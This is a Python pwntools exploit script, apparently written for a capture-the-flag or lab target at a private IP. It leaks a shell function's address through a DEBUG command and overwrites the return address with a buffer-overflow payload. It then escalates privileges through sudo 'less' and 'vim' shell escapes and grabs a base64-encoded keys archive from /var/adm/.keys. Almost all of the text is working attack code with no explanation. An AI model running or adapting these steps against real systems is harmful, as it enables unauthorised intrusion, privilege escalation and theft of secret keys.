from pwn import *
import re, time

context.log_level = "error"
HOST="10.100.16.100"; PORT=9999

def get_shell():
    p = remote(HOST, PORT)
    p.recvuntil(b"cmd> ")
    p.send(b"DEBUG\n")
    data = p.recvuntil(b"Password: ")
    m = re.search(rb"userpass @ (0x[0-9a-f]+) shell @ (0x[0-9a-f]+)", data)
    shell = int(m.group(2),16)
    payload = b"A"*40 + p64(shell)[:6]
    p.send(payload)
    p.recvuntil(b"Denied\n")
    return p

def run(p, cmd, wait=1.5):
    p.sendline(cmd.encode())
    time.sleep(wait)
    out = p.recv(timeout=wait)
    return out.decode(errors="ignore")

def run_long(p, cmd, wait=3):
    p.sendline(cmd.encode())
    time.sleep(wait)
    out = b""
    while True:
        try:
            chunk = p.recv(timeout=1)
        except Exception:
            break
        if not chunk:
            break
        out += chunk
    return out.decode(errors="ignore")

p = get_shell()
run(p, "id")
run(p, "sudo -u frank less /var/log/syslog", wait=2)
run(p, "!/bin/sh", wait=2)
run(p, "sudo -u adm vim /var/www/html/jailuser/dev/jail.c", wait=2)
run(p, ":!/bin/sh", wait=3)
print("id:", run(p, "id", wait=2))
b64 = run_long(p, "base64 -w0 /var/adm/.keys/keys.zip; echo DONEMARKER", wait=4)
open("keys_zip_b64.txt","w").write(b64)
print("len captured:", len(b64))
p.close()
